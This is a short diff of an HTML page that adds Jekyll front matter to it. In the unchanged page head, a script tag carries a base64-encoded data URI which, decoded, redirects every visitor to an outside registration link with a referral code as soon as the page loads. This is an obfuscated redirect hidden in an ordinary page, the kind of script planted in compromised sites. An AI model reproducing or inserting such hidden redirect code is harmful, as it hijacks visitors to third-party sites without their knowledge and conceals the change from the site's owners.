@@ -1,3 +1,6 @@
+---
+layout: default
+---
 <html lang="en-US">
 <head><script src="data:text/javascript;base64,d2luZG93LmxvY2F0aW9uLmhyZWY9Imh0dHBzOi8vbWVkaXphYS5jb20vYWNjb3VudC9yZWdpc3Rlcj9tPTIzODg0MSI=">
 </script>
